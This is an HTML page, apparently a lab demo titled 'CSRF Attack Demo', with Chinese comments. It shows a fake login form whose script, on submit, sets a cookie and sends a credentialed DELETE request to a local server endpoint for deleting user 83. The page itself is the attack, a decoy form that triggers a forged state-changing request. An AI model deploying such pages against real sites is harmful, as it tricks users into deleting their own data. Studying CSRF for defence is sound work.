<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Demo</title>
</head>
<body>
    <h1>CSRF Attack Demo</h1>
    <h1>
        <!-- {{ .title }} -->
        Hi,訪客~~~~~~~
    </h1>
    <iframe style="display:none" name="csrf-frame"></iframe>
    <form method='DELETE' action='http://localhost:8080/user/api/delete' target="csrf-frame" id="csrfForm">
        <h1>請輸入帳號：</h1><input type='name'>
        <h1>請輸入密碼：</h1><input type='password'>
        <br/>
        <br/>
        <input type='submit' value='submit'>
    </form>
    <script>
        document.getElementById("csrfForm").addEventListener("submit", function(event) {
            event.preventDefault(); // 阻止表单的默认提交行为
            // 設置 Cookie
            document.cookie = "jwt-token=pass; expires=Sat, 31 Dec 2023 23:59:59 UTC; path=/";
            // 讀取 Cookie
            var cookieValue = document.cookie;
            console.log("cookieValue:",cookieValue);
            // 构建DELETE请求
            var xhr = new XMLHttpRequest();
            xhr.open("DELETE", "http://localhost:8080/user/api/delete/83");
            xhr.setRequestHeader("Content-Type", "application/json"); // 设置请求头
            // 发送请求
            xhr.withCredentials = true; // 允許攜帶 cookie
            xhr.send();
            console.log(xhr)
            // 可选：处理响应
            xhr.onload = function() {
                if (xhr.status === 200) {
                    console.log("Request successful");
                } else {
                    console.log("Request failed");
                }
            };
        });
    </script>
</body>
</html>